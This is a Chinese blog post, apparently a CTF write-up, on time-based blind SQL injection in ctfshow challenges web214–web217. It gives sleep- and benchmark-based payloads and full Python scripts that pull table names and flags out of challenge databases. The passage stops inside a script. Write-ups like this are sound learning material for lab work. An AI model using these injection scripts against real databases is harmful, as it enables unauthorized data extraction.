<!DOCTYPE html><meta name="referrer" content="no-referrer"><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web214-web253SQL注入篇（三） | 心流</title><meta name="author" content="Natro92"><meta name="copyright" content="Natro92"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="web214时间盲注终于知道是哪来的注入点了，在主页的网络包中有一个select.js中能看到： 12345678910$.ajax(&amp;#123;  url:&amp;#x27;api&#x2F;&amp;#x27;,  dataType:&quot;json&quot;,  type:&amp;#x27;post&amp;#x27;,  data:&amp;#123;    ip:returnCitySN[&quot;cip&quot;],">
<meta property="og:type" content="article">
<meta property="og:title" content="web214-web253SQL注入篇（三）">
<meta property="og:url" content="https://natro92.github.io/2023/09/17/web214-web253SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/index.html">
<meta property="og:site_name" content="心流">
<meta property="og:description" content="web214时间盲注终于知道是哪来的注入点了，在主页的网络包中有一个select.js中能看到： 12345678910$.ajax(&amp;#123;  url:&amp;#x27;api&#x2F;&amp;#x27;,  dataType:&quot;json&quot;,  type:&amp;#x27;post&amp;#x27;,  data:&amp;#123;    ip:returnCitySN[&quot;cip&quot;],">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg">
<meta property="article:published_time" content="2023-09-17T09:23:43.000Z">
<meta property="article:modified_time" content="2023-09-17T09:23:45.801Z">
<meta property="article:author" content="Natro92">
<meta property="article:tag" content="WriteUp">
<meta property="article:tag" content="CTFshow0-1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://natro92.github.io/2023/09/17/web214-web253SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"简","msgToSimplifiedChinese":"繁"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'web214-web253SQL注入篇（三）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-09-17 17:23:45'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><nav id="nav"><span id="blog-info"><a href="/" title="心流"><span class="site-name">心流</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">web214-web253SQL注入篇（三）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-17T09:23:43.000Z" title="发表于 2023-09-17 17:23:43">2023-09-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-17T09:23:45.801Z" title="更新于 2023-09-17 17:23:45">2023-09-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>49分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="web214-web253SQL注入篇（三）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/09/17/web214-web253SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/09/17/web214-web253SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>终于知道是哪来的注入点了，在主页的网络包中有一个<code>select.js</code>中能看到：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(<span class="punctuation">&#123;</span></span><br><span class="line">  url<span class="punctuation">:</span>&#x27;api/&#x27;<span class="punctuation">,</span></span><br><span class="line">  dataType<span class="punctuation">:</span><span class="string">&quot;json&quot;</span><span class="punctuation">,</span></span><br><span class="line">  type<span class="punctuation">:</span>&#x27;post&#x27;<span class="punctuation">,</span></span><br><span class="line">  data<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    ip<span class="punctuation">:</span>returnCitySN<span class="punctuation">[</span><span class="string">&quot;cip&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    debug<span class="punctuation">:</span><span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span>);</span><br></pre></td></tr></table></figure>
<p>向其中可以存在注入点。<br>hackbar测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282687265-a4a97ad1-82db-4165-ba3f-d36f1b9c060b.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282697392-c201a11b-9f33-4447-837e-6f89afbcd904.png" alt="image.png"><br>有sql执行，继续构建测试payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=if(substr(database(),1,1)=(&#x27;c&#x27;),sleep(5),1)&amp;debug=0</span><br></pre></td></tr></table></figure>
<p>然后就是写脚本<br>先贴一下佬们的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">Author:Y4tacker</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # 查数据库</span><br><span class="line">        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br><span class="line">        # 查列名字-id.flag</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;&quot;</span><br><span class="line">        # 查数据</span><br><span class="line">        payload = &quot;select flaga from ctfshow_flagx&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;ip&#x27;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,</span><br><span class="line">            &#x27;debug&#x27;:&#x27;0&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url, data=data, timeout=1)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>我的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://6ec95228-b921-42dc-ba05-78d8a7decd79.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagx&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select group_concat(flaga) from ctfshow_flagx&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;if(substr((&#123;&#125;),&#123;&#125;,1)=(&quot;&#123;&#125;&quot;),sleep(1),1)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>substr这个函数不从0开始，从1开始。别傻乎乎的用错了。<br>可以用try来做一个微调，如果出现问题就可以自己修改。<br>注意要传的是<code>/api/</code>不是<code>/api</code>传错了可没有回显</p>
<h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><p>提示用了单引号，得闭合一下就行<br>测试payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">1</span><span class="string">&#x27; or sleep(3) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>&amp;debug=<span class="number">0</span></span><br><span class="line">或者</span><br><span class="line">ip=<span class="number">1</span><span class="string">&#x27; or sleep(3) #&amp;debug=0</span></span><br></pre></td></tr></table></figure>
<p>修改脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://8f775fc1-f6d1-431e-9ac4-93ab0f082a11.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxc&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select group_concat(flagaa) from ctfshow_flagxc&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1&#x27; or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),sleep(1),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>操作可以快一点，用一点快捷键。<br>pycharm中搜索快捷键<code>ctrl + f</code>，替换快捷键<code>ctrl + r</code>。<br>搜索中修改正则：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[a-zA-Z0-<span class="number">9</span>-./]+</span><br></pre></td></tr></table></figure>
<p>然后替换写入新网址，这样就能快一点</p>
<h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h3 id="from-base64-id"><a href="#from-base64-id" class="headerlink" title="from_base64($id)"></a>from_base64($id)</h3><p>加了一个查询：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where <span class="built_in">id</span> = from_base64($<span class="built_in">id</span>);</span><br></pre></td></tr></table></figure>
<p>只需要把1的base64 <code>MQ==</code>，添加的到原payload中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="string">&#x27;MQ==&#x27;</span>) <span class="keyword">or</span> sleep(<span class="number">3</span>) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&amp;debug=0</span></span><br></pre></td></tr></table></figure>
<h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h3 id="benchmark函数的时间盲注"><a href="#benchmark函数的时间盲注" class="headerlink" title="benchmark函数的时间盲注"></a>benchmark函数的时间盲注</h3><p>加了个过滤，把sleep给ban了，可以用benchmark代替。<br>BENCHMARK是SQL中的一个函数,主要用于测试SQL语句的执行效率。其语法如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count, expr)</span><br></pre></td></tr></table></figure>
<p>其中count表示重复执行expr的次数。<br>这里的测试如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">1</span>) <span class="keyword">and</span> benchmark(<span class="number">500000</span>,sha(<span class="number">1</span>))<span class="comment">#&amp;debug=0</span></span><br></pre></td></tr></table></figure>
<p>由于网络环境不同，需要根据情况下微调timeout的值：<br>这里我有点没太明白的点在于，为什么调用database函数时和查询时相同benchmark的延迟差很多</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">比如</span><br><span class="line">ip=<span class="number">1</span>) <span class="keyword">or</span> <span class="keyword">if</span>(substr((database()),<span class="number">1</span>,<span class="number">1</span>)=(<span class="string">&#x27;c&#x27;</span>),benchmark(<span class="number">500000</span>,sha(<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">&amp;debug=<span class="number">0</span></span><br><span class="line">有<span class="number">1.45</span>s</span><br><span class="line">而</span><br><span class="line">ip=<span class="number">1</span>) <span class="keyword">or</span> <span class="keyword">if</span>(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()),<span class="number">1</span>,<span class="number">1</span>)=(<span class="string">&#x27;c&#x27;</span>),benchmark(<span class="number">3500000</span>,sha(<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">&amp;debug=<span class="number">0</span></span><br><span class="line">是<span class="number">1.72</span>s</span><br></pre></td></tr></table></figure>
<p>因此次数在脚本中需要多次调试。<br>而且由于这个时间是随着运行时间增长而会导致越到后面越不准确。<br>因此可以用limit关键字对flag进行分割。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span 